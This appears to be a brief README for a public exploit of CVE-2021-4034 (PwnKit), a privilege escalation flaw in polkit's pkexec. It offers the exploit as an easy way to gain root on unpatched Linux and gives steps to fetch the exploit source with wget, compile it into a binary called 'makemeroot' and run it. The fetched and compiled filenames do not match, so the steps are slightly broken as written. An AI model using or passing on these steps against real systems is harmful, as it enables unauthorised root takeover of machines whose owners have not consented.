# PWNKIT Vulnerability - CVE-2021-4034

CVE-2021-4034 (PWNKIT)

A memory corruption vulnerability in Polkit's pkexec, which allows any unprivileged user to gain full root privileges on a vulnerable system using default polkit configuration.

Easy to use, local privilege escalation on any non-patched linux sysyem.

## Usage (e.g. CentOS 7)

### Fetch exploit
```
wget https://gitlab.com/nelox/pwnkit-vulnerability/blasty-vs-pkexec.c
```

### Compile it using gcc
```
gcc bblasty-vs-pkexec.c -o makemeroot
```

### Execute
```
./makemeroot
whoami
```
